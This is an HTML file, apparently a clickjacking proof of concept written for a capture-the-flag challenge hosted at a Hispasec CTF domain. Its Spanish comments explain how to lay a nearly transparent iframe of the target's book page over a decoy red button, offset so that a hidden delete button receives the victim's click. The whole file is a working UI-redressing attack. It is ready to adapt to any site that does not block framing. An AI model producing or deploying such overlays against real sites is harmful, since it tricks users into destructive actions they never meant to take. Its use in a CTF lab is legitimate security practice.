<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin: 0; padding: 0; overflow: hidden; }

        #wrapper {
            position: relative;
            width: 1000px;
            height: 800px;
            overflow: hidden; /* Cortamos la vista */
        }

        iframe {
            position: absolute;
            width: 1000px;
            height: 2000px; /* Muy alto */
            border: none;
            z-index: 2;
            opacity: 0.5; /* AJUSTA Y LUEGO PON EN 0.001 */
            
            /* --- EL TRUCO DEL SCROLL --- */
            /* Movemos el iframe hacia ARRIBA para que el botón de borrar
               quede justo en la esquina superior izquierda (0,0) */
            top: -780px; 
            left: -20px;
        }

        #objetivo {
            position: absolute;
            top: 0;
            left: 0;
            width: 300px;  /* Ahora es un botón en la esquina superior */
            height: 100px;
            z-index: 1;    /* Debajo del iframe */
            background: red;
        }
    </style>
</head>
<body>
    <div id="wrapper">
        <button id="objetivo"></button>
        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>
</body>
</html>
